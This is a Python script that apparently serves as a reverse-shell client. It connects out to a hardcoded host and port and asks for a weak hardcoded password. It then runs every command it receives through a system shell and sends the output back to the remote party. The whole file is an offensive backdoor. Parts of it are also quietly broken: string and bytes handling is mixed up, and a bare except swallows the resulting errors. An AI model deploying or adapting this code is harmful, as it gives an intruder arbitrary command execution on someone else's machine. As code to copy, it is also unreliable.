import socket
import os
import subprocess

HOST = "10.0.2.4"
PORT = 80
BUFFER = 1024
CORRECT_PASS = "password"
# client
def main():
    # HOST = raw_input("give me a host to connect to :3: ") # for python 2.7.5
    print("running client side with: " + HOST + " and " + str(PORT))

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
    print("attempting to connect")
    client.connect((HOST, PORT))

    # password
    client.send("Input your password: ".encode())
    password = client.recv(BUFFER).decode("UTF-8")
    incorrect_count = 0
    while password != CORRECT_PASS:
        incorrect_count += 1
        client.send("Incorrect password. Please try again: ".encode())
        password = client.recv(BUFFER).decode("UTF-8")
        if incorrect_count == 3:
            break

    if incorrect_count == 3:
        client.send("Incorrect password. Closing connection")
        client.close()
    else: 

        # send something
        while True: 
            # something = raw_input("what do you wnant to send to this not evil thingy (enter to exit): ")
            # if something == "":
            #     break
            # data = raw_input("input a command: ")
            
            command = client.recv(BUFFER).decode("UTF-8")
            commmand = command.split(" ")
            # EXDCUTING COMMAND
            # getoutput returns output stdout and stderr of executing cmd in a shell
            print(command)
            if command == "":
                print("command is empty")
                break
            try: 
                output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                client.send(output.encode())
            except:
                print("uh oh spaghetti o you have an error with your input :c")
            
        client.close()

if __name__ == "__main__":
    main()